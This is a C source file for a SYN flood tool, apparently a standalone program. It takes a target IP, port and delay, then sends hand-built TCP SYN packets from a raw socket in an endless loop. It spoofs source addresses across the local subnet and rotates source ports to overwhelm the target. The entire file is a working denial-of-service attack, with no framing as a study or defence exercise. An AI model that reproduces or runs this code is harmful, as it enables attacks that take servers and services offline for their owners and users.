#include<stdio.h>
#include<string.h>
#include<sys/socket.h>
#include<stdlib.h>
#include<netinet/in.h>
#include<arpa/inet.h>
#include <ifaddrs.h>


#include "header.h"

int main(int argc, char *argv[])
{
    u_int32_t src_ip;
	char *dest_ip = malloc(16);
	strcpy(dest_ip, "192.168.1.1");
    
    int total = 0;
    int error = 0;
    int temp = 50;
    
    u_int16_t source_port = htons(9999);
    u_int16_t dest_port = htons(22);
    
    switch(argc){
            
        case 3: 
            strncpy(dest_ip, argv[1], 15);
            dest_ip[15] = '\0';
            dest_port = htons(atoi(argv[2]));
        break;
        
        case 4:
            strncpy(dest_ip, argv[1], 15);
            dest_ip[15] = '\0';
            dest_port = htons(atoi(argv[2]));
            temp = atoi(argv[3]);
        break;
            
        default:
            printf("USAGE :\n\n");
            printf("synflood ip port [rest_time]\n");
            printf("ip : IP address, eg. 192.168.1.1\n");
            printf("port : destination port, eg. 80\n");
            printf("rest_time : time between two SYN dispatches in micro seconds. Default is 50. 0 is allowed.\n");
            return 1;
        break;
            
    }
	int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if(fd < 0)
	{
		perror("Error creating raw socket at first try ");
		exit(1);
	}
    
    printf("Attack on addr : %s\n",dest_ip);
    
    struct ifaddrs *ifap, *ifa;
    struct sockaddr_in *sa[3];
    
    u_int32_t start;
    u_int32_t stop;

    getifaddrs (&ifap);
    for (ifa = ifap; ifa; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr->sa_family==AF_INET && strcmp(ifa->ifa_name,"en1") == 0) {
            
            sa[0] = (struct sockaddr_in *) ifa->ifa_addr;
            sa[1] = (struct sockaddr_in *) ifa->ifa_netmask;
            sa[2] = (struct sockaddr_in *) ifa->ifa_dstaddr;
    
            src_ip = sa[0]->sin_addr.s_addr;
            
            u_int32_t test1 = sa[0]->sin_addr.s_addr;
            u_int32_t test2 = sa[1]->sin_addr.s_addr;

            start = test1&test2;
            stop = test1|(~test2);
    
            }
    }

    int hincl = 1;                  /* 1 = on, 0 = off */
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(hincl));
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = dest_port;
    sin.sin_addr.s_addr = inet_addr (dest_ip);

	if(fd < 0)
	{
		perror("Error creating raw socket ");
		exit(1);
	}

	while(1){
    
        total++;
        
        char packet[65536];
        memset(packet, 0, 65536);

        //IP header pointer
        struct iphdr *iph = (struct iphdr *)packet;

        //TCP header pointer
        struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
        struct pseudo_udp_header psh;

        //fill the IP header here

        iph->ihl = 5;
        iph->version = 4;

        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
        iph->id = htons(9999);
        iph->frag_off = 0;
        iph->ttl = 64;
        iph->protocol = 6; //for TCP
        iph->check = 0;
        iph->saddr = src_ip;
        inet_pton(AF_INET, dest_ip, &(iph->daddr));

        //fill the TCP Header

        tcph->source = source_port;
        tcph->dest = dest_port;
        tcph->seq = htonl(1);
        tcph->ack_seq = htonl(1);
        tcph->res1 = 0;
        tcph->doff = 5;
        tcph->fin = 0;
        tcph->syn = 1;
        tcph->rst = 0;
        tcph->psh = 0;
        tcph->ack = 0;
        tcph->urg = 0;
        tcph->res2 = 0;
        tcph->window = htons(20);
        tcph->check = 0;
        tcph->urg_ptr = 0;
    
        //Fill the pseudo TCP header
        psh.source_address = src_ip;
        inet_pton(AF_INET, dest_ip, &(psh.dest_address));
        psh.placeholder = 0;
        psh.protocol = 6;
        psh.udp_length = htons(sizeof(struct tcphdr));

        //Checksum
        
        register long sum;
        unsigned short oddbyte;

        int nbytes = sizeof(struct pseudo_udp_header);
        unsigned short *ptr = (u_int16_t *) &psh;

        sum=0;
        while(nbytes>1) {
            sum+=*ptr++;
            nbytes-=2;
        }

        nbytes = sizeof(struct tcphdr);
        ptr = (u_int16_t *) tcph;
        while(nbytes>1) {
            sum+=*ptr++;
            nbytes-=2;
        }
        if(nbytes==1) {
            oddbyte=0;
            *((u_char*)&oddbyte)=*(u_char*)ptr;
            sum+=oddbyte;
        }

        sum = (sum>>16)+(sum & 0xffff);
        sum = sum + (sum>>16);
        tcph->check = (short)~sum;
        
        iph->check = checksum((u_int16_t *)packet, iph->tot_len);
    
        //send the packet

        if (sendto (fd, packet, iph->tot_len ,  0, (struct sockaddr *) &sin, sizeof (sin)) < 0)
            {
                //perror("Sendto failed");
                error++;
            }
        else
            {
                //printf ("Packet Send. Length : %d \n" , iph->tot_len);
            }
              
            src_ip += htonl(1);
        
            if(src_ip >= stop){
                src_ip = start;
            }
        
        if(total != 0 && total%30000 == 0){
            
            printf("\n\n#####################STATS######################\n");
            printf("Packets sent : %d\n", total-error);
            printf("Packets failed : %d\n", error);
            
        }
        
        if(htons(source_port) > 20000 || htons(source_port) < 5000){
            source_port = htons(10000);
        }
        else{
            source_port = htons(htons(source_port) + 1);
        }
        
        if(temp != 0)
            usleep(temp);
    }

	return 0;

}
